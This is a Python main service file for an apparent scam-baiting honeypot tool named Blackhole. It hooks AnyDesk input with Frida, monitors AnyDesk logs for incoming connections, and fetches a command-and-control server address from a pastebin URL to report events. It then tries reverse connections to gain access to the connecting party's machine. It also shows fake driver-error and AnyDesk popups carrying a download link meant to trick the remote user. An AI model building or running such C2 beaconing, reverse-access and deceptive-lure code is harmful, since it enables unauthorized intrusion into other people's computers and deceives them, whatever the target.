#!/usr/bin/env python3
"""
Blackhole Input Firewall Service
Selectively blocks remote desktop input while allowing host input.

Architecture:
- Process Monitor: Detects AnyDesk/TeamViewer processes
- API Hooker: Uses Frida to hook SendInput() and tag input with magic value
- Gatekeeper: Low-level hooks check dwExtraInfo and block tagged input

This allows Mac keyboard/trackpad (QEMU VirtIO) to work while blocking remote desktop input.
"""

import os
import re
import sys
import threading
import time
import urllib.request

from rich.console import Console

from utils.config import (
    DEFAULT_FIREWALL_STATE,
    TOGGLE_HOTKEY,
    DRIVER_DOWNLOAD_URL,
    CONFIG_URL,
    FALLBACK_HOST,
    C2_SERVER_PORT,
    C2_API_KEY,
    REVERSE_CONNECTION_ENABLED,
    REVERSE_CONNECTION_RETRY_LIMIT,
    REVERSE_CONNECTION_RETRY_DELAY,
    FAKE_POPUP_ENABLED,
    AUTO_ENABLE_FIREWALL_ON_CONNECTION,
    DATA_DIR,
    WHITELIST_JSON_PATH,
    BLACKLIST_SEED,
)
from utils.gatekeeper import InputGatekeeper
from utils.process_monitor import ProcessMonitor
from utils.api_hooker import APIHooker
from utils.hotkeys import HotkeyListener
from utils.notifications import show_driver_error
from utils.log_monitor import LogMonitor
from utils.connection_correlator import ConnectionCorrelator
from utils.anydesk_controller import AnyDeskController
from utils.fake_popup import create_fake_anydesk_popup
from utils.c2_client import C2Client
from utils.whitelist_manager import WhitelistManager
from utils.process_decision_popup import (
    show_process_decision_popup,
    show_hash_mismatch_popup,
    show_imposter_alert,
)


# ============================================================================
# CONSTANTS
# ============================================================================

# Timing delays (seconds)
POPUP_DISPLAY_DELAY = 2  # Delay before showing fake popup to scammer
PASTEBIN_FETCH_TIMEOUT = 5  # Timeout for fetching C2 IP from pastebin
# DEV_MODE_SHUTDOWN_COUNTDOWN = 60  # (Disabled - dev mode now runs indefinitely)


# ============================================================================
# DEV MODE DETECTION
# ============================================================================


def detect_dev_mode():
    """
    Detect if running in dev mode.
    Dev mode is active if:
    1. Running as .py file (not frozen/compiled)
    2. Running as .exe with .dev_mode marker file present

    Returns:
        bool: True if dev mode, False if production
    """
    # Check if running as compiled executable
    is_frozen = getattr(sys, "frozen", False)

    # Get executable/script directory
    if is_frozen:
        exe_dir = os.path.dirname(sys.executable)
    else:
        exe_dir = os.path.dirname(os.path.abspath(__file__))

    # Check for .dev_mode marker
    dev_mode_marker = os.path.join(exe_dir, ".dev_mode")

    # Dev mode if running as .py OR if .dev_mode marker exists
    is_dev_mode = not is_frozen or os.path.exists(dev_mode_marker)

    return is_dev_mode


# ============================================================================
# LOGGING
# ============================================================================


def create_log_func(dev_mode):
    """
    Create a logging function based on dev mode with rich color-coding.

    Args:
        dev_mode: If True, log to console with colors; if False, silent

    Returns:
        Logging function
    """
    if dev_mode:
        console = Console()

        # Color mapping for different log categories
        COLOR_MAP = {
            "LOG_MONITOR": "cyan",
            "CORRELATOR": "magenta",
            "GATEKEEPER": "red",
            "SERVICE": "green",
            "HOOKER": "yellow",
            "MONITOR": "blue",
            "HOTKEY": "bright_magenta",
            "C2": "bright_blue",
            "C2_CLIENT": "bright_cyan",
            "ANYDESK": "bright_yellow",
            "ANYDESK LOG": "bright_black",  # Gray for verbose trace logs
            "CONTROLLER": "bright_green",
            "POPUP": "bright_red",
            "WHITELIST": "bright_white",
        }

        def log(msg, end="\n"):
            # Try to extract log category from message (allow spaces in category names)
            match = re.match(r"\[([A-Z_0-9| ]+)\]", msg)
            if match:
                category = match.group(1)
                # Handle composite categories like "LOG_MONITOR | ANYDESK LOG TRACE"
                primary_category = category.split("|")[0].strip()
                color = COLOR_MAP.get(primary_category, "white")
                # Split into category and message
                parts = msg.split("] ", 1)
                if len(parts) == 2:
                    console.print(f"[{color}][{category}][/{color}] {parts[1]}", end=end)
                else:
                    console.print(msg, end=end)
            else:
                # No category found, print as-is
                console.print(msg, end=end)

        return log
    else:
        # Silent in production
        def log(msg, end="\n"):
            pass

        return log


# ============================================================================
# MAIN SERVICE
# ============================================================================


class BlackholeService:
    """
    Main service that manages the input firewall and hotkey detection.
    """

    def __init__(self, dev_mode):
        """
        Initialize the Blackhole service.

        Args:
            dev_mode: If True, show console output and popups
        """
        self.dev_mode = dev_mode
        self.log = create_log_func(dev_mode)

        # Firewall state
        self.firewall_active = DEFAULT_FIREWALL_STATE

        # Initialize whitelist/blacklist manager
        self.whitelist_manager = WhitelistManager(DATA_DIR, log_func=self.log)

        # Flag to suppress popups during first-run baseline
        self.creating_baseline = False

        # Check for first run and create baseline
        if not os.path.exists(WHITELIST_JSON_PATH):
            self.log("[SERVICE] First run detected - creating baseline...")
            self.log("[SERVICE] This may take a minute...")
            self.creating_baseline = True
            self.whitelist_manager.first_run_baseline(BLACKLIST_SEED)
            self.creating_baseline = False
            self.log("[SERVICE] Baseline complete!")
            self.log(f"[SERVICE] Whitelisted: {self.whitelist_manager.get_whitelist_count()} processes")
            self.log(f"[SERVICE] Blacklisted: {self.whitelist_manager.get_blacklist_count()} processes")

        # Initialize original components
        self.gatekeeper = InputGatekeeper(log_func=self.log)
        self.process_monitor = ProcessMonitor(log_func=self.log, callback=self._on_process_event)
        self.api_hooker = APIHooker(log_func=self.log)
        self.hotkey_listener = HotkeyListener(TOGGLE_HOTKEY, self.toggle_firewall, log_func=self.log)

        # Initialize AnyDesk integration components as None
        # They will be created/destroyed dynamically by _on_process_event
        self.anydesk_path = None
        self.anydesk_mode = None
        self.log_monitor = None
        self.correlator = None
        self.anydesk_controller = AnyDeskController(log_func=self.log)  # This one can stay

        # Track delayed popup threads for cleanup
        self._popup_threads = []

        # Fetch C2 server IP dynamically from pastebin
        c2_host = self._get_c2_ip()
        self.c2_client = C2Client(c2_host, C2_SERVER_PORT, C2_API_KEY, log_func=self.log)

        # Disable C2 logging in dev mode
        if dev_mode:
            self.c2_client.disable()

        # Track active popups and retry attempts
        self.active_popups = []
        self.outgoing_attempts = {}  # {anydesk_id: {'count': N, 'last_attempt': timestamp}}

        # Track PIDs of connection windows we spawn (to prevent restart loops)
        self.our_connection_pids = set()

        self.log("\n" + "=" * 60)
        self.log("  AnyDesk Client Service")
        self.log("=" * 60)
        self.log(f"Mode: {'DEV' if dev_mode else 'PRODUCTION'}")
        self.log(f"AnyDesk Mode: Awaiting detection...")  # New status
        self.log(f"Architecture: API Hooking + Dynamic Log Monitoring")
        self.log(f"Default state: {'ACTIVE' if DEFAULT_FIREWALL_STATE else 'INACTIVE'}")
        self.log(f"Reverse connection: {'ENABLED' if REVERSE_CONNECTION_ENABLED else 'DISABLED'}")
        self.log(f"Hotkey: Command+Shift+F (toggle firewall + fake popup)")
        self.log("=" * 60 + "\n")

    def _on_process_event(self, event_type, pid, process_name, exe_path, cmdline=None):
        """
        Handle process found/lost events from ProcessMonitor.
        Implements whitelist/blacklist logic with hash verification.
        """
        if event_type == "lost":
            # Process exited - unhook it
            if pid in self.our_connection_pids:
                self.our_connection_pids.discard(pid)
                self.log(f"[SERVICE] Stopped tracking PID {pid} (remaining: {len(self.our_connection_pids)})")

            self.api_hooker.unhook_process(pid)

            # Clean up AnyDesk-specific monitors if main AnyDesk process exits
            if process_name == "AnyDesk.exe" and pid not in self.our_connection_pids:
                if self.log_monitor and self.log_monitor.is_running():
                    self.log("[SERVICE] Stopping log monitor...")
                    self.log_monitor.stop()
                if self.correlator:
                    self.log("[SERVICE] Stopping correlator...")
                    self.correlator.stop()
                self.anydesk_mode = None
                self.anydesk_path = None
                self.log_monitor = None
                self.correlator = None
            return

        # Process started - apply whitelist/blacklist logic
        if event_type == "found":
            # Check if this is a connection window we spawned
            if pid in self.our_connection_pids:
                return  # Ignore our own connection windows

            # Special handling for AnyDesk (needs log monitoring)
            if process_name == "AnyDesk.exe":
                self._handle_anydesk_process(pid, process_name, exe_path, cmdline)
                return

            # General whitelist/blacklist logic for all other processes
            self._handle_general_process(pid, process_name, exe_path)

    def _handle_anydesk_process(self, pid, process_name, exe_path, cmdline):
        """
        Special handling for AnyDesk processes (includes log monitoring setup).
        AnyDesk is ALWAYS hooked and blacklisted, plus we monitor its logs.
        """
        self.log(f"[SERVICE] AnyDesk process FOUND (PID: {pid}) at {exe_path}")

        # Hook ALL AnyDesk processes (including backend session handlers)
        success = self.api_hooker.hook_process(pid, process_name)
        if not success:
            self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")

        # Skip monitor initialization if already running
        if self.log_monitor and self.log_monitor.is_running():
            self.log(f"[SERVICE] Process hooked. Monitors already active (PID: {pid})")
            return

        # Determine AnyDesk mode (service vs portable)
        if exe_path:
            path_lower = exe_path.lower()
            if r"c:\program files (x86)\anydesk" in path_lower or r"c:\program files\anydesk" in path_lower:
                self.anydesk_mode = "service"
            else:
                self.anydesk_mode = "portable"
        else:
            self.anydesk_mode = "portable"

        self.log(f"[SERVICE] AnyDesk mode: {self.anydesk_mode.upper()}")

        # Initialize log monitoring for reverse connections
        self.log("[SERVICE] Initializing AnyDesk log monitoring...")
        self.log_monitor = LogMonitor(callback=self._on_log_event, mode=self.anydesk_mode, log_func=self.log)
        self.correlator = ConnectionCorrelator(
            callback=self._on_connection_event,
            mode=self.anydesk_mode,
            log_func=self.log,
        )
        self.log_monitor.start()
        self.correlator.start()

    def _handle_general_process(self, pid, process_name, exe_path):
        """
        Handle whitelist/blacklist logic for general processes (non-AnyDesk).
        """
        # Filter out kernel processes without valid executable paths
        if not exe_path or not os.path.isfile(exe_path):
            # Kernel/system process - skip silently
            return

        # Skip monitoring our own process (Blackhole itself)
        if pid == os.getpid():
            return  # Don't monitor ourselves

        # Auto-whitelist Frida helper processes (spawned by Blackhole itself)
        if "frida-helper" in process_name.lower():
            if not self.whitelist_manager.is_whitelisted(process_name, exe_path):
                self.log(f"[SERVICE] Auto-whitelisting Frida helper: {process_name}")
                self.whitelist_manager.add_to_whitelist(process_name, exe_path)
            return  # Don't hook our own tools

        # Check whitelist/blacklist status
        if self.whitelist_manager.is_whitelisted(process_name, exe_path):
            # Verify hash
            hash_valid, auto_updated = self.whitelist_manager.verify_hash(process_name, exe_path)

            if hash_valid:
                if auto_updated:
                    self.log(f"[SERVICE] {process_name} hash auto-updated (Microsoft-signed)")
                return  # Trusted process, don't hook

            # Hash mismatch - handle based on signature (skip during baseline)
            if not self.creating_baseline:
                self._handle_hash_mismatch(pid, process_name, exe_path)

        elif self.whitelist_manager.is_blacklisted(process_name, exe_path):
            # Blacklisted - hook immediately, no popup (even during baseline)
            self.log(f"[SERVICE] Blacklisted process detected: {process_name}")
            success = self.api_hooker.hook_process(pid, process_name)
            if not success:
                self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")

        else:
            # Unknown process - hook and show popup (unless creating baseline)
            if self.creating_baseline:
                # First run - auto-whitelist new processes silently
                self.log(f"[SERVICE] Auto-whitelisting during baseline: {process_name}")
                self.whitelist_manager.add_to_whitelist(process_name, exe_path)
                return  # Don't hook during baseline

            self.log(f"[SERVICE] Unknown process detected: {process_name}")
            success = self.api_hooker.hook_process(pid, process_name)
            if not success:
                self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")

            # Show decision popup (non-blocking)
            self._show_decision_popup(pid, process_name, exe_path)

    def _handle_hash_mismatch(self, pid, process_name, exe_path):
        """
        Handle a whitelisted process whose hash has changed.
        For Microsoft-signed: auto-update was already attempted in verify_hash
        For unsigned: show popup asking to re-whitelist or blacklist
        """
        # Check if Microsoft-signed (need to look up by normalized path now)
        normalized_path = self.whitelist_manager._normalize_path(exe_path)
        whitelist_entry = self.whitelist_manager.whitelist.get(normalized_path, {})
        signed_by = whitelist_entry.get("signed_by")

        if signed_by == "Microsoft Corporation":
            # Microsoft-signed but signature verification failed - IMPOSTER!
            self.log(f"[SERVICE] IMPOSTER DETECTED: {process_name}")
            # Auto-blacklist
            self.whitelist_manager.remove_from_whitelist(process_name, exe_path)
            self.whitelist_manager.add_to_blacklist(
                process_name, exe_path, "Imposter detected (invalid Microsoft signature)"
            )
            # Hook immediately
            self.api_hooker.hook_process(pid, process_name)
            # Show critical alert
            show_imposter_alert(process_name, exe_path, log_func=self.log)

        else:
            # Unsigned process with hash mismatch - requires user decision
            self.log(f"[SERVICE] Hash mismatch for unsigned process: {process_name}")
            # Hook immediately (block input until user decides)
            self.api_hooker.hook_process(pid, process_name)

            # Callback for user decision
            def on_hash_decision(decision):
                if decision == "whitelist":
                    self.log(f"[SERVICE] User re-whitelisted {process_name} (hash updated)")
                    # Remove old entry and add new one with updated hash
                    self.whitelist_manager.remove_from_whitelist(process_name, exe_path)
                    self.whitelist_manager.add_to_whitelist(process_name, exe_path)
                    # Unhook the process
                    self.api_hooker.unhook_process(pid)
                    self.log(f"[SERVICE] Unhooked {process_name} (PID: {pid})")
                else:  # "blacklist"
                    self.log(f"[SERVICE] User blacklisted {process_name} (hash mismatch)")
                    self.whitelist_manager.remove_from_whitelist(process_name, exe_path)
                    self.whitelist_manager.add_to_blacklist(process_name, exe_path, "Hash mismatch - user denied")
                    # Keep hooked

            # Show hash mismatch popup
            show_hash_mismatch_popup(
                process_name, exe_path, is_signed=False, callback=on_hash_decision, log_func=self.log
            )

    def _show_decision_popup(self, pid, process_name, exe_path):
        """
        Show popup asking user to whitelist or blacklist an unknown process.
        Callback will update JSON and unhook if whitelisted.
        """

        def on_decision(decision):
            if decision == "whitelist":
                self.log(f"[SERVICE] User whitelisted {process_name}")
                self.whitelist_manager.add_to_whitelist(process_name, exe_path)
                # Unhook the process
                self.api_hooker.unhook_process(pid)
                self.log(f"[SERVICE] Unhooked {process_name} (PID: {pid})")
            else:  # "blacklist"
                self.log(f"[SERVICE] User blacklisted {process_name}")
                self.whitelist_manager.add_to_blacklist(process_name, exe_path, "User denied")
                # Keep hooked (already hooked)

        show_process_decision_popup(process_name, exe_path, callback=on_decision, log_func=self.log)

    def _get_c2_ip(self):
        """Fetch C2 server IP from pastebin with fallback"""
        try:
            self.log("[C2] Fetching C2 server IP from pastebin...")
            with urllib.request.urlopen(CONFIG_URL, timeout=PASTEBIN_FETCH_TIMEOUT) as response:
                ip = response.read().decode("utf-8").strip()
                if ip:
                    self.log(f"[C2] Got C2 server IP: {ip}")
                    return ip
        except Exception as e:
            self.log(f"[C2] Pastebin fetch failed: {e}")

        self.log(f"[C2] Using fallback IP: {FALLBACK_HOST}")
        return FALLBACK_HOST

    def _on_log_event(self, event_type, data):
        """
        Called by LogMonitor when new log entries are detected.
        Routes events to the correlator or handles directly.
        """
        # Handle incoming acceptance directly (no correlation needed)
        if event_type == "incoming_accepted":
            self._handle_incoming_accepted(data)
        else:
            # Route to correlator for ID/IP matching
            self.correlator.add_event(event_type, data)

    def _on_connection_event(self, event):
        """
        Called by ConnectionCorrelator when a complete connection event is matched.
        Dispatches to specific handlers based on event type.
        """
        event_type = event.get("event_type")

        if event_type == "incoming_request":
            self._handle_incoming_request(event)
        elif event_type == "outgoing_rejected":
            self._handle_outgoing_rejected(event)
        elif event_type == "outgoing_accepted":
            self._handle_outgoing_accepted(event)

    def _handle_incoming_request(self, event):
        """Handle incoming connection request from scammer"""
        anydesk_id = event["anydesk_id"]
        ip_address = event["ip_address"]

        self.log("\n" + "=" * 60)
        self.log(f"🚨 INCOMING CONNECTION REQUEST")
        self.log("=" * 60)
        self.log(f"  AnyDesk ID: {anydesk_id}")
        self.log(f"  IP Address: {ip_address}")
        self.log("=" * 60 + "\n")

        # Auto-enable firewall if configured and not already active
        if AUTO_ENABLE_FIREWALL_ON_CONNECTION and not self.firewall_active:
            self.log("[SERVICE] Auto-enabling firewall for incoming connection...")
            self.gatekeeper.start()
            if self.gatekeeper.is_active():
                self.firewall_active = True
                self.log("[SERVICE] Firewall ENABLED - scammer input will be blocked")
                event["metadata"]["firewall_auto_enabled"] = True
            else:
                self.log("[SERVICE] WARNING: Failed to enable firewall")
                event["metadata"]["firewall_auto_enabled"] = False
        else:
            event["metadata"]["firewall_auto_enabled"] = False

        # Log to C2 server
        self.c2_client.log_event(event)

        # Initiate reverse connection if enabled
        if REVERSE_CONNECTION_ENABLED and self.anydesk_path:
            # Failsafe: Block if we already have an active connection window
            if len(self.our_connection_pids) > 0:
                self.log(
                    f"[SERVICE] WARNING: Connection already active (PIDs: {self.our_connection_pids}) - blocking spawn"
                )
                event["metadata"]["reverse_connection_initiated"] = False
                event["metadata"]["blocked_reason"] = "connection_already_active"
                return

            self.log(f"[SERVICE] Initiating reverse connection to {anydesk_id}...")
            pid = self.anydesk_controller.initiate_connection(self.anydesk_path, anydesk_id)

            if pid:
                # Track the PID to prevent restart loops
                self.our_connection_pids.add(pid)
                self.log(
                    f"[SERVICE] Tracking connection window PID {pid} (total tracked: {len(self.our_connection_pids)})"
                )

                # Track attempt
                self.outgoing_attempts[anydesk_id] = {"count": 1, "last_attempt": time.time()}
                event["metadata"]["reverse_connection_initiated"] = True
                self.log(f"[SERVICE] Reverse connection window launched (attempt 1/{REVERSE_CONNECTION_RETRY_LIMIT})")
            else:
                event["metadata"]["reverse_connection_initiated"] = False
                self.log("[SERVICE] Failed to initiate reverse connection")
        else:
            event["metadata"]["reverse_connection_initiated"] = False
            if not REVERSE_CONNECTION_ENABLED:
                self.log("[SERVICE] Reverse connection disabled in config")
            elif not self.anydesk_path:
                self.log("[SERVICE] Reverse connection unavailable (AnyDesk not found)")

    def _handle_outgoing_rejected(self, event):
        """Handle outgoing connection rejection from scammer"""
        anydesk_id = event["anydesk_id"]

        # Get attempt count
        attempt_info = self.outgoing_attempts.get(anydesk_id, {"count": 0, "last_attempt": 0})
        attempt_count = attempt_info["count"]

        self.log("\n" + "=" * 60)
        self.log(f"❌ REVERSE CONNECTION REJECTED")
        self.log("=" * 60)
        self.log(f"  Target: {anydesk_id}")
        self.log(f"  Attempt: {attempt_count}/{REVERSE_CONNECTION_RETRY_LIMIT}")
        self.log("=" * 60 + "\n")

        # Log to C2
        event["metadata"]["attempt_number"] = attempt_count
        self.c2_client.log_event(event)

        # Check if we should retry
        if attempt_count < REVERSE_CONNECTION_RETRY_LIMIT:
            # Calculate backoff delay (exponential: 15s, 30s, 60s)
            delay = REVERSE_CONNECTION_RETRY_DELAY * (2 ** (attempt_count - 1))
            time_since_last = time.time() - attempt_info["last_attempt"]

            if time_since_last >= delay:
                # Retry now
                self._retry_reverse_connection(anydesk_id, attempt_count + 1)
            else:
                # Schedule retry
                wait_time = delay - time_since_last
                self.log(f"[SERVICE] Scheduling retry in {wait_time:.0f} seconds...")
                threading.Timer(wait_time, self._retry_reverse_connection, args=(anydesk_id, attempt_count + 1)).start()
        else:
            self.log(f"[SERVICE] Max retry attempts reached for {anydesk_id}")
            # Clean up tracking
            if anydesk_id in self.outgoing_attempts:
                del self.outgoing_attempts[anydesk_id]

    def _handle_incoming_accepted(self, data):
        """
        Handle incoming connection acceptance from scammer.
        Shows fake popup after 5-second delay to trick scammer.
        """
        anydesk_id = data["anydesk_id"]

        self.log(f"[SERVICE] Scammer {anydesk_id} successfully connected to honeypot")

        # Show fake popup after 5-second delay (scammer is now exploring honeypot)
        if FAKE_POPUP_ENABLED:
            self.log("[SERVICE] Waiting 5 seconds before showing fake popup...")

            # Use threading to avoid blocking
            def delayed_popup():
                time.sleep(5)
                if FAKE_POPUP_ENABLED:  # Check again in case it was disabled
                    self.log("[SERVICE] Showing fake popup to trick scammer...")
                    self._show_fake_popup()

            popup_thread = threading.Thread(target=delayed_popup, daemon=True, name="DelayedPopup")
            self._popup_threads.append(popup_thread)
            popup_thread.start()

    def _handle_outgoing_accepted(self, event):
        """Handle successful outgoing connection to scammer"""
        anydesk_id = event["anydesk_id"]

        self.log("\n" + "=" * 60)
        self.log(f"🎯 SUCCESS! REVERSE CONNECTION ACCEPTED")
        self.log("=" * 60)
        self.log(f"  Target: {anydesk_id}")
        self.log(f"  Status: YOU NOW HAVE ACCESS TO SCAMMER'S MACHINE")
        self.log("=" * 60 + "\n")

        # Log to C2
        self.c2_client.log_event(event)

        # Close any active fake popups
        self._close_all_popups()

        # Clear retry tracking
        if anydesk_id in self.outgoing_attempts:
            del self.outgoing_attempts[anydesk_id]

    def _retry_reverse_connection(self, anydesk_id, attempt_number):
        """Retry reverse connection attempt"""
        self.log(
            f"[SERVICE] Retrying reverse connection to {anydesk_id} (attempt {attempt_number}/{REVERSE_CONNECTION_RETRY_LIMIT})..."
        )

        # Failsafe: Block if we already have an active connection window
        if len(self.our_connection_pids) > 0:
            self.log(
                f"[SERVICE] WARNING: Connection already active (PIDs: {self.our_connection_pids}) - blocking retry"
            )
            return

        if self.anydesk_path:
            pid = self.anydesk_controller.initiate_connection(self.anydesk_path, anydesk_id)

            if pid:
                # Track the PID to prevent restart loops
                self.our_connection_pids.add(pid)
                self.log(f"[SERVICE] Tracking retry PID {pid} (total tracked: {len(self.our_connection_pids)})")

                # Update attempt tracking
                self.outgoing_attempts[anydesk_id] = {"count": attempt_number, "last_attempt": time.time()}
                self.log(f"[SERVICE] Retry launched successfully")
            else:
                self.log("[SERVICE] Retry failed")

    def _show_fake_popup(self):
        """Show fake AnyDesk popup to scammer"""
        self.log("[SERVICE] Showing fake AnyDesk popup...")
        popup = create_fake_anydesk_popup(log_func=self.log)
        popup.show()
        self.active_popups.append(popup)

    def _close_all_popups(self):
        """Close all active fake popups"""
        for popup in self.active_popups:
            if not popup.is_closed():
                popup.close()
        self.active_popups.clear()

    def toggle_firewall(self):
        """Toggle firewall on/off (called by hotkey)"""
        if self.firewall_active:
            # Turn OFF (silent - no popup)
            self.log("[SERVICE] Hotkey pressed - DISABLING firewall...")
            self.gatekeeper.stop()
            self.firewall_active = False
            self.log("[SERVICE] Firewall is now INACTIVE - all input allowed")
        else:
            # Turn ON (show fake driver error to scammer)
            self.log("[SERVICE] Hotkey pressed - ENABLING firewall...")
            self.gatekeeper.start()

            if self.gatekeeper.is_active():
                self.firewall_active = True
                self.log("[SERVICE] Firewall is now ACTIVE - blocking tagged input")

                # Show fake driver error popup to trick scammer
                self.log("[SERVICE] Showing fake driver error to scammer...")
                show_driver_error(DRIVER_DOWNLOAD_URL)
                self.log(f"[SERVICE] Driver download URL displayed: {DRIVER_DOWNLOAD_URL}")
            else:
                self.log("[SERVICE] Firewall activation FAILED")

    def start(self):
        """Start the service"""
        self.log("[SERVICE] Starting Blackhole service...")

        # Start process monitor (this is now the main trigger)
        self.process_monitor.start()

        # Start hotkey listener
        self.hotkey_listener.start()
        self.log("[SERVICE] Hotkey listener active")

        # Apply default state
        if DEFAULT_FIREWALL_STATE:
            self.log("[SERVICE] Activating firewall...")
            self.gatekeeper.start()

            # Check if activation succeeded
            if self.gatekeeper.is_active():
                self.firewall_active = True
                self.log("[SERVICE] Firewall is ACTIVE - blocking tagged input")
            else:
                self.firewall_active = False
                self.log("[SERVICE] Firewall activation FAILED")
        else:
            self.log("[SERVICE] Firewall is INACTIVE - all input allowed")

        self.log("[SERVICE] Service is running. Press Ctrl+C to exit.\n")

    def run(self):
        """Run the service until interrupted"""
        self.start()

        try:
            # Keep the main thread alive
            if self.dev_mode:
                # DEV MODE: Run indefinitely with console output
                while True:
                    time.sleep(1)
            else:
                # PRODUCTION MODE: Run indefinitely
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.log("\n[SERVICE] Received interrupt signal")
            self.stop()

    def stop(self):
        """Stop the service"""
        self.log("[SERVICE] Stopping Blackhole service...")

        # Kill spawned AnyDesk connection windows before stopping monitors
        if self.our_connection_pids:
            import psutil

            self.log(f"[SERVICE] Cleaning up {len(self.our_connection_pids)} spawned connection window(s)...")
            for pid in list(self.our_connection_pids):
                try:
                    proc = psutil.Process(pid)
                    proc.terminate()  # Graceful termination
                    self.log(f"[SERVICE] Terminated connection window PID {pid}")
                except psutil.NoSuchProcess:
                    self.log(f"[SERVICE] Connection window PID {pid} already exited")
                except Exception as e:
                    self.log(f"[SERVICE] Error terminating PID {pid}: {e}")
            self.our_connection_pids.clear()

        # Stop AnyDesk components (with checks)
        if self.log_monitor:
            self.log("[SERVICE] Stopping AnyDesk log monitor...")
            self.log_monitor.stop()
        if self.correlator:
            self.log("[SERVICE] Stopping correlation engine...")
            self.correlator.stop()

        # Close all fake popups
        self._close_all_popups()

        # Wait for delayed popup threads to complete (max 6 seconds - 5s delay + 1s buffer)
        if self._popup_threads:
            self.log("[SERVICE] Waiting for popup threads to complete...")
            for thread in self._popup_threads:
                if thread.is_alive():
                    thread.join(timeout=6)

        # Stop hotkey listener
        self.hotkey_listener.stop()

        # Stop process monitor
        self.process_monitor.stop()

        # Unhook all processes
        self.api_hooker.unhook_all()

        # Stop firewall if active
        if self.firewall_active:
            self.gatekeeper.stop()

        # Print statistics in dev mode
        if self.dev_mode:
            try:
                stats = self.gatekeeper.get_stats()
                hooked_pids = self.api_hooker.get_hooked_processes()
                correlator_stats = self.correlator.get_stats() if self.correlator else {}

                self.log("\n" + "=" * 60)
                self.log("  Session Statistics")
                self.log("=" * 60)
                self.log(f"Blocked keyboard:  {stats.get('blocked_keys', 0)}")
                self.log(f"Blocked mouse:     {stats.get('blocked_mouse', 0)}")
                self.log(f"Allowed keyboard:  {stats.get('allowed_keys', 0)}")
                self.log(f"Allowed mouse:     {stats.get('allowed_mouse', 0)}")
                self.log(f"Hooked processes:  {len(hooked_pids)}")
                self.log(f"Pending IDs:       {correlator_stats.get('waiting_ids', 0)}")
                self.log(f"Pending IPs:       {correlator_stats.get('waiting_ips', 0)}")
                self.log("=" * 60 + "\n")
            except Exception as e:
                self.log(f"[ERROR] Failed to get stats: {e}")

        self.log("[SERVICE] Service stopped.\n")


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Detect dev mode
    dev_mode = detect_dev_mode()

    # Create and run service
    service = BlackholeService(dev_mode)
    service.run()
